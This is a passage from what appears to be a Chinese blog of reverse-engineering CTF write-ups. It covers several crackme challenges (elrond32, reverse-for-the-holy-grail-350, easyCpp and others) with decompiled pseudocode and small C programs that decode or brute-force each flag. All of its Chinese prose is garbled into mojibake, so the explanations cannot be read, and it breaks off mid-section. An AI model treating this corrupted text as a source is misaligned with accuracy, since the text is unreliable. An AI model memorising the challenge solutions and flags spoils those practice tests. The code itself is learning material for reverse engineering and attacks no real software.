class="number">49</span>);</span><br><span class="line">  sub_401220(v85, <span class="number">1</span>);</span><br><span class="line">  v86 = sub_401220(&amp;v120[<span class="number">21</span>], <span class="number">1</span>);</span><br><span class="line">  v87 = sub_401100(v86, <span class="number">1000000000</span>);</span><br><span class="line">  v88 = sub_401000(v87, <span class="number">54</span>);</span><br><span class="line">  v89 = sub_401220(v88, <span class="number">1</span>);</span><br><span class="line">  v90 = sub_401000(v89, <span class="number">1000000000</span>);</span><br><span class="line">  sub_401220(v90, <span class="number">1000000000</span>);</span><br><span class="line">  v91 = sub_401000(&amp;v120[<span class="number">22</span>], <span class="number">49</span>);</span><br><span class="line">  v92 = sub_401220(v91, <span class="number">1</span>);</span><br><span class="line">  v93 = sub_401000(v92, <span class="number">2</span>);</span><br><span class="line">  sub_401220(v93, <span class="number">1</span>);</span><br><span class="line">  v94 = sub_401100(&amp;v120[<span class="number">23</span>], <span class="number">10</span>);</span><br><span class="line">  v95 = sub_401220(v94, <span class="number">5</span>);</span><br><span class="line">  v96 = sub_401100(v95, <span class="number">8</span>);</span><br><span class="line">  v97 = sub_401000(v96, <span class="number">9</span>);</span><br><span class="line">  sub_401000(v97, <span class="number">48</span>);</span><br><span class="line">  v98 = sub_401000(&amp;v120[<span class="number">24</span>], <span class="number">1</span>);</span><br><span class="line">  v99 = sub_401000(v98, <span class="number">3</span>);</span><br><span class="line">  v100 = sub_401000(v99, <span class="number">3</span>);</span><br><span class="line">  v101 = sub_401000(v100, <span class="number">3</span>);</span><br><span class="line">  v102 = sub_401000(v101, <span class="number">6</span>);</span><br><span class="line">  v103 = sub_401000(v102, <span class="number">6</span>);</span><br><span class="line">  v104 = sub_401000(v103, <span class="number">6</span>);</span><br><span class="line">  sub_401000(v104, <span class="number">20</span>);</span><br><span class="line">  v105 = sub_401000(&amp;v120[<span class="number">25</span>], <span class="number">55</span>);</span><br><span class="line">  v106 = sub_401220(v105, <span class="number">33</span>);</span><br><span class="line">  v107 = sub_401000(v106, <span class="number">44</span>);</span><br><span class="line">  v108 = sub_401220(v107, <span class="number">11</span>);</span><br><span class="line">  sub_401000(v108, <span class="number">42</span>);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">26</span>], v120[<span class="number">25</span>]);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">27</span>], v120[<span class="number">12</span>]);</span><br><span class="line">  v109 = v120[<span class="number">27</span>];</span><br><span class="line">  v110 = sub_401220(&amp;v120[<span class="number">28</span>], <span class="number">1</span>);</span><br><span class="line">  v111 = sub_401000(v110, v109);</span><br><span class="line">  sub_401220(v111, <span class="number">1</span>);</span><br><span class="line">  v112 = v120[<span class="number">23</span>];</span><br><span class="line">  v113 = sub_401220(&amp;v120[<span class="number">29</span>], <span class="number">1</span>);</span><br><span class="line">  v114 = sub_401100(v113, <span class="number">1000000</span>);</span><br><span class="line">  sub_401000(v114, v112);</span><br><span class="line">  v115 = v120[<span class="number">27</span>];</span><br><span class="line">  v116 = sub_401000(&amp;v120[<span class="number">30</span>], <span class="number">1</span>);</span><br><span class="line">  sub_401100(v116, v115);</span><br><span class="line">  sub_401000(&amp;v120[<span class="number">31</span>], v120[<span class="number">30</span>]);</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"CTF&#123;"</span>);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="number">32</span>; ++j )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%c"</span>, (v120[j]));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"&#125;\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="reverse-for-the-holy-grail-350"><a href="#reverse-for-the-holy-grail-350" class="headerlink" title="reverse-for-the-holy-grail-350"></a>reverse-for-the-holy-grail-350</h3><p>åˆæ˜¯C++çš„é¢˜, å¯¹äºåˆå­¦, æˆ‘çœ‹è¿™ä¸ªæœ‰äº›è¿˜æ˜¯å¾ˆåƒåŠ›çš„, æœ‰äº›å‡½æ•°åŠŸèƒ½è¿è’™å¸¦çŒœ. å…¶å®é™ä¸‹å¿ƒæ¥åˆ†æ, é€»è¾‘è¿˜æ˜¯å¾ˆç®€å•.</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421172942651-1590549186380-1591952692434.png" alt="image-20200421172942651-1590549186380"></p><p>æ‰¾åˆ°å…³é”®å‡½æ•°è¿›å»å, çœ‹èµ·æ¥å¾ˆå¤š, ä½†é€»è¾‘ä¹Ÿæ˜¯ä¸éš¾çš„. </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421173112461-1590549193146-1591952706873.png" alt="image-20200421173112461-1590549193146"></p><p>è¿™æ˜¯ç¨‹åºçš„ç®—æ³•, æˆ‘æŒ¨ä¸ªè®°å½•äº†ä¸‹æ¥â€¦â€¦..æˆ‘åœ¨åˆ°è¿™æ­¥çš„æ—¶å€™, å°±æ˜¯åœ¨çº ç»“é‚£ä¸ªå–ä½™å¤šè§£çš„é—®é¢˜, æƒ³åˆ°ç®—èµ·æ¥å¾ˆçƒ¦, ä½†ç”±äºæ˜¯å¯è¾“å…¥çš„å­—ç¬¦, æˆ‘ä»¬ç”¨éå†å³å¯ (0-127)</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421173211318-1590549201703-1591952713057.png" alt="image-20200421173211318-1590549201703"></p><p>æœ€åé™„ä¸Š,  ä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> first[] = &#123;<span class="number">0x41</span>, <span class="number">0x69</span>, <span class="number">0x6e</span>, <span class="number">0x45</span>, <span class="number">0x6f</span>, <span class="number">0x61</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> second[] = &#123;<span class="number">0x2ef</span>, <span class="number">0x2c4</span>, <span class="number">0x2dc</span>, <span class="number">0x2c7</span>, <span class="number">0x2de</span>, <span class="number">0x2fc</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> third[] = &#123;<span class="number">0x1d7</span>, <span class="number">0xc</span>, <span class="number">0x244</span>, <span class="number">0x25e</span>, <span class="number">0x93</span>, <span class="number">0x6c</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> mod[<span class="number">18</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, n = <span class="number">666</span>, j = <span class="number">0</span>, z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">mod[i] = n;</span><br><span class="line">n += n%<span class="number">5</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i += <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = first[j];</span><br><span class="line"></span><br><span class="line">flag[i+<span class="number">2</span>] = second[j] ^ mod[i+<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(z = <span class="number">0</span>; z &lt; <span class="number">127</span>; z++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>((flag[i] ^ mod[i])*(z^mod[i+<span class="number">1</span>]) % second[j] == third[j])</span><br><span class="line">&#123;</span><br><span class="line">flag[i+<span class="number">1</span>] = z;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">j++;</span><br><span class="line"> </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%c"</span>, flag[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ€»ç»“: ç¨‹åºä¸­æ³¨æ„çœ‹æ¸…ä¼ å…¥å‚æ•°æ—¶,æ˜¯ä¸€ä¸ªå­—èŠ‚, è¿˜æ˜¯ä¸€ä¸ªintç±»å‹(4ä¸ªå­—èŠ‚); å–ä½™è¿ç®—, é€†å‘æ—¶, ä¸€èˆ¬éå†å³å¯.</p><h3 id="elrond32"><a href="#elrond32" class="headerlink" title="elrond32"></a>elrond32</h3><p>é¦–å…ˆ, ä¸‹è½½ä¸‹æ¥, ç”¨idaæ‰“å¼€, å‘ç°æ²¡æœ‰è¾“å…¥çš„åœ°æ–¹. æˆ–è®¸æ˜¯éšè—èµ·æ¥äº†. å°±åœ¨linuxä¸­è¿è¡Œä¸€ä¸‹æ¥çœ‹, æœç„¶æ²¡æœ‰è¾“å…¥, åªæ˜¯è¾“å‡ºéªŒè¯å¤±è´¥.</p><p>å›åˆ°ida, é€»è¾‘ä¹Ÿå¾ˆæ¸…æ¥š, å°±æ˜¯ä¸€ä¸ªå‡½æ•°çš„è¿”å›å€¼ é0 å³å¯, è¿›å…¥å…³é”®å‡½æ•°: ä¹Ÿå¾ˆç®€å•, å°±æ˜¯ä¸€ä¸ªé€’å½’è°ƒç”¨. ä»0å¼€å§‹, æ¯æ¬¡ (a1) éƒ½ç¬¦åˆç›¸åº”çš„å€¼ä¸”æœ€è¦æœ€åçš„è·³å‡ºé€’å½’å³å¯.é€šè¿‡è¿™ä¸ªæˆ‘ä»¬å°±çŸ¥é“äº† a1æ•°ç»„çš„å€¼.  ç®—äº†ä¸€ä¸‹ a2çš„å€¼ä¸º: 0 7 1 3 6 5 9 4 2, è€Œ2æ²¡æœ‰å°±è·³å‡º. æŒ‰ç…§è¿™ä¸ªé¡ºåºå– (a1) .</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200421190646720-1590549218465-1591952718294.png" alt="image-20200421190646720-1590549218465"></p><p>å…¶å®æµè§ˆç¨‹åºçš„æ—¶å€™, å·²ç»çœ‹è¿‡ éªŒè¯é€šè¿‡ä¸‹é¢çš„ä¸€ä¸ªå‡½æ•°, å°±æ˜¯è®©33ä¸ªå·²ç»ç¼–ç äº†çš„å­—ç¬¦ä¸æˆ‘ä»¬å¾—åˆ°çš„ (a1)å¼‚æˆ–è¿ç®—, å†æ‰“å°å‡ºflag. ä¸‹é¢Cä»£ç :</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = &#123;<span class="number">105</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">100</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;<span class="keyword">char</span> b[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">int</span> n[<span class="number">33</span>];</span><br><span class="line">&#125;A = &#123;</span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">31</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">4</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">66</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">68</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">13</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">6</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">45</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">30</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">15</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">28</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">35</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">7</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">2</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">12</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">8</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">65</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">10</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">20</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">32</span>; i++)</span><br><span class="line"><span class="built_in">putchar</span>(A.n[i] ^ a[i % <span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ç™¾è¶Šæ¯2018-crazy"><a href="#ç™¾è¶Šæ¯2018-crazy" class="headerlink" title="ç™¾è¶Šæ¯2018-crazy"></a>ç™¾è¶Šæ¯2018-crazy</h3><p>é¦–å…ˆï¼Œè¿™é“é¢˜çš„ç®—æ³•å¾ˆç®€å•ï¼Œå°±æ˜¯è€ƒå¼•ç”¨C++çš„å­—ç¬¦ä¸²ç±»çš„å‡½æ•°ã€‚ ä½†æ˜¯è‡ªå·±ä¹ŸæŒ–æ˜äº†ä¸€äº›æ„Ÿè§‰æœ‰ç”¨çš„ä¸œè¥¿ï¼Œä¸»è¦æ˜¯é€šè¿‡è¿™é“é¢˜æ€»ç»“ c++å­—ç¬¦ä¸²ç±»ã€‚</p><p>æ‹–å…¥ExeinfoPeï¼Œé¢˜ç›®æ˜¯64ä¸ºelfæ–‡ä»¶ï¼Œç”¨64ä¸ºidaæ‰“å¼€ã€‚</p><p>æ‰¾åˆ°ä¸»å‡½æ•°ï¼Œ æŸ¥çœ‹ä¼ªä»£ç ï¼Œå‘ç°å¾ˆå†—é•¿ï¼Œä½†å¤§å¤šæ•°éƒ½æ˜¯é‚£äº›å­—ç¬¦ä¸²ç±»å‡½æ•°å’Œæ— ç”¨çš„ä¿¡æ¯ã€‚ æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ç‚¹å‡»æœ€åæ¯”è¾ƒè¦ç”¨åˆ°çš„å­—ç¬¦ä¸²çš„åç§°ï¼Œè¿™æ—¶ä¼šæŠŠæ‰€æœ‰ç›¸åŒåç§°éƒ½é«˜äº®æ˜¾ç¤ºå‡ºæ¥ï¼Œå°±å¯ä»¥é€šè¿‡é€»è¾‘åˆ¤æ–­å‡ºé‚£äº›æ˜¯å…³é”®å‡½æ•°å’Œå˜é‡ã€‚</p><p>ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°  <strong>HighTemplar::HighTemplar((DarkTemplar *)&amp;v23ï¼Œ(__int64)&amp;input);</strong> </p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427213407581.png" alt="image-20200427213407581"></p><p>ç¬¬äºŒä¸ªå…³é”®å‡½æ•° <strong>HighTemplar::calculate((HighTemplar *)&amp;v23);</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427213610870.png" alt="image-20200427213610870"></p><p>ç¬¬ä¸‰ä¸ªå…³é”®å‡½æ•° <strong>HighTemplar::getSerial((HighTemplar *)&amp;v23)</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427213959893.png" alt="image-20200427213959893"></p><p>æœ€åwpï¼šä½†æ˜¯è¦å¼•èµ·æ³¨æ„çš„æ˜¯è¿™ä¸ªflagçœŸçš„å¥‡æ€ªï¼Œå¼€å§‹ä»¥ä¸ºç®—é”™äº†ï¼Œæ£€æŸ¥å‡ éï¼Œæœ€åå°±æ˜¯è¿™ä¸ª <strong>tMx~qdstOs~crvtwb~aOba}qddtbrtcd</strong>  å†åŠ ä¸Šflag{}</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"327a6c4304ad5938eaf0efb6cc3e53dc"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i] - <span class="number">11</span>) ^ <span class="number">0x13</span>;</span><br><span class="line">a[i] = (a[i] - <span class="number">23</span>) ^ <span class="number">0x50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ€»ç»“ï¼š</strong>å…ˆè¯´ä¸€ä¸‹åšè¿™ä¸ªé¢˜æƒ³è¿‡çš„ä¸€ä¸ªé—®é¢˜ã€‚  æˆ‘ä»¬çŸ¥é“ <strong>rodata</strong> æ®µæ˜¯åªè¯»çš„ï¼Œå­˜æ”¾å¸¸é‡ç­‰ï¼Œä½†æ˜¯è¿™é‡Œå´æœ‰å­—ç¬¦ä¸²åœ°å€çš„èµ‹å€¼ï¼Œä»–æŠŠ <strong>0x401EA0</strong> åœ°å€çš„å€¼æ”¹å˜äº†ï¼Œä½†ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å‘¢ï¼ŒæŸ¥äº†èµ„æ–™ï¼Œä¹Ÿæƒ³äº†å¾ˆä¹…ï¼Œæœ€åè®¤ä¸ºåº”è¯¥æ˜¯å­˜æ”¾çš„æŒ‡é’ˆ,è€Œä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸€æ®µéƒ½æ˜¯8å­—èŠ‚çš„å¢åŠ ï¼Œéƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆ 8å­—èŠ‚çš„å¤§å°ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427215217839.png" alt="image-20200427215217839"></p><p>è¿™é‡Œä¹Ÿé€šè¿‡æŸ¥èµ„æ–™ï¼ŒçŸ¥é“äº†ä»¥å‰å­¦ä¹ æŒ‡é’ˆçš„ç–‘é—®ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200427215908475.png" alt="image-20200427215908475"></p><p><strong>å› ä¸ºæˆ‘ä»¬åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„æ—¶,æ•°ç»„çš„åˆå§‹å€¼æ”¾åœ¨rodataæ®µé‡Œé¢ã€‚æ•°ç»„å¯¹åº”å¼€è¾Ÿçš„ç©ºé—´ä¸Šçš„æ•°å€¼å­˜æ”¾åœ¨æ ˆä¸Š,ç¼–è¯‘å™¨ä¼šå»è®¿é—®rodataæ®µä¸Šçš„åˆå§‹å€¼ç„¶åå–æ¥åˆå§‹åŒ–å±€éƒ¨å˜é‡ï¼Œå› æ­¤æ•°ç»„çš„å€¼æ‰èƒ½ä¿®æ”¹ã€‚ è€ŒæŒ‡é’ˆæŒ‡å‘çš„æ˜¯rodataæ®µï¼Œæ˜¯ä¸èƒ½è¢«ä¿®æ”¹çš„</strong>ã€‚</p><p>ç¬¬äºŒä¸ªå°±æ˜¯é€šè¿‡c++å®˜æ–¹æ‰‹å†Œçš„æŸ¥è¯¢å¯¹å„ç§c++å¼•ç”¨çš„å„ç§å­—ç¬¦ä¸²çš„æ€»ç»“ã€‚ ä¸‹é¢çš„ a b ä¸ºå­—ç¬¦æ•°ç»„ã€‚</p><table><thead><tr><th align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::operator<a href="aï¼Œi"></a></char></char></th></tr></thead><tbody><tr><td align="left">å³ <strong>a[i]</strong> çš„æ„æ€ï¼Œå¦‚æœoperatoråé¢æ²¡æœ‰ <strong>[]</strong>ï¼Œé‚£å°±æ˜¯  <strong>a+i</strong></td></tr><tr><td align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::basic_string(aï¼Œbï¼Œlenth)</char></char></td></tr><tr><td align="left">å³  <strong>strncpy(aï¼Œbï¼Œlenth)</strong>  ç¬¬ä¸‰ä¸ªå‚æ•°å¯é€‰</td></tr><tr><td align="left">std::allocator<char>::~allocator(a)  <strong>å‘ç°åªè¦å‰é¢æœ‰ä¸ª ~ çš„éƒ½æ˜¯é‡Šæ”¾</strong>ã€‚</char></td></tr><tr><td align="left">å³ <strong>free(a)</strong></td></tr><tr><td align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::length(a)</char></char></td></tr><tr><td align="left">å³ <strong>strlen(a)</strong></td></tr><tr><td align="left">std::operator&lt;&lt;&lt;std::char_traits<char>&gt;(&amp;std::coutï¼Œâ€helloâ€) åé¢æ€»è·Ÿç€ä¸‹é¢ä¸€å¥ã€‚ <strong>å…³é”®æ˜¯count</strong></char></td></tr><tr><td align="left">std::ostream::operator&lt;&lt;(v1ï¼Œ(__int64)&amp;std::endl&lt;char,std::char_traits<char>&gt;)                                                                     å³  <strong>printf(â€œhelloâ€)</strong></char></td></tr><tr><td align="left">std::operator&gt;&gt;&lt;char,std::char_traits<char>,std::allocator<char>&gt;(&amp;std::cinï¼Œ&amp;a) <strong>å…³é”®æ˜¯in</strong></char></char></td></tr><tr><td align="left">å³ <strong>gets(a)</strong></td></tr></tbody></table><hr><h3 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h3><blockquote><p>C++é€†å‘çš„é¢˜ï¼Œåˆšå¼€å§‹æ¥è§¦å¾ˆå¤šä»£ç çœ‹ä¸æ‡‚,æ„Ÿè§‰å¯è¯»æ€§ä½ã€‚  ä½†æ˜¯çœ‹å¤šäº†ï¼Œè¿˜æ˜¯ä¼šå¥½å¾ˆå¤šã€‚ æ˜¯ä¸€ä¸ªæ…¢æ…¢ç†Ÿæ‚‰stlçš„è¿‡ç¨‹å§ã€‚</p></blockquote><p>ç»è¿‡äº†ä¸€äº›CPPé€†å‘é¢˜çš„æŠ˜ç£¨ï¼Œè¿™ä¸ªé¢˜å¤§å¤šæ•°å‡½æ•°è¿æ‡µå¸¦çŒœçš„çœ‹èµ·æ¥è¿˜å¥½ï¼Œä½†æ˜¯é‡åˆ°äº†ä¸€ä¸ªä¸ä»”ç»†çš„é”™è¯¯ï¼Œæƒ³äº†å¾ˆä¹…ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>64ä½elfæ–‡ä»¶ï¼Œè½½å…¥idaï¼Œå‡½æ•°çš„å¤§éƒ¨åˆ†è¿˜æ˜¯çœ‹æ‡‚äº†ã€‚ 2ä¸ªå…³é”®å‡½æ•°ã€‚  <strong>transform  accumulate</strong></p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510182506239.png" alt="image-20200510182506239"></p><p>å…ˆè¿›å…¥ transformã€‚ ç®—æ³•ä¹Ÿæ˜¯å¾ˆç®€å•ï¼Œå°±æ˜¯å‡½æ•°è¯»èµ·æ¥æ›´éº»çƒ¦ã€‚</p><p><img src="/2020/04/09/%E9%80%86%E5%90%91%E7%BB%83%E4%B9%A0/image-20200510182650313.png" alt="image-20200510182650313"></p><p>ä¸‹é¢ accumulateã€‚ è¿™ä¸ªçœ‹èµ·æ¥å°±ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“äº†ï¼Œæœ‰å¾ˆå¤šåœ°å€ä¼ è¿‡æ¥ä¼ è¿‡å»å°±å¾ˆæ··æ·†ã€‚ 